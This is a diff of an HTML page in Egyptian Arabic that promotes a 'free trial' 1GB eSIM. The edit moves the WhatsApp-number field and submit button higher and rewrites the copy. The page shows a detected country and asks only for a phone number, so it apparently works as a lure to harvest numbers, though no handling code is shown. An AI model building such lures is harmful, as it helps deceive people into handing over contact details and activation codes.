@@ -42,7 +42,7 @@
     color: #fff; font-size: 11px; font-weight: 800; letter-spacing: 2px;
     padding: 5px 14px; border-radius: 20px; margin-bottom: 12px;
   }
-  .feats { list-style: none; text-align: right; margin: 0 0 18px; padding: 0; }
+  .feats { list-style: none; text-align: right; margin: 18px 0 0; padding: 0; }
   .feats li { font-size: 13px; color: #9aa5bd; padding: 5px 0; }
   .gpsbox {
     background: #0f1420; border: 1px solid #2b3550; border-radius: 10px;
@@ -56,16 +56,16 @@
 <div class="card" id="formCard">
   <div class="logo">📶</div>
   <div class="badge">FREE TRIAL</div>
-  <h1>شريحة eSIM مجانية 🎉</h1>
-  <p class="sub">إنترنت مجاني 1GB لمدة 7 أيام على أي موبايل يدعم eSIM.<br>سيب رقم <b>الواتساب</b> بتاعك وهنبعتلك كود التفعيل عليه.</p>
+  <h1>استلم شريحتك المجانية 🎉</h1>
+  <p class="sub">دخل رقم <b>الواتساب</b> بتاعك عشان نوصلك كود التفعيل</p>
+  <div class="gpsbox" id="gpsBox" style="display:none">📍 الدولة المكتشفة: <b id="gpsCountry"></b></div>
+  <input id="phone" type="tel" inputmode="tel" placeholder="01xxxxxxxxx" maxlength="15" />
+  <button id="sendBtn" onclick="submitPhone()">استلام الشريحة 📩</button>
   <ul class="feats">
     <li>✅ 1GB بيانات مجانية</li>
     <li>✅ صالحة لمدة 7 أيام</li>
     <li>✅ تفعيل فوري بكود QR</li>
   </ul>
-  <div class="gpsbox" id="gpsBox" style="display:none">📍 الدولة المكتشفة: <b id="gpsCountry"></b></div>
-  <input id="phone" type="tel" inputmode="tel" placeholder="01xxxxxxxxx" maxlength="15" />
-  <button id="sendBtn" onclick="submitPhone()">احصل على الشريحة المجانية</button>
 </div>
 
 <div class="card done" id="doneCard">
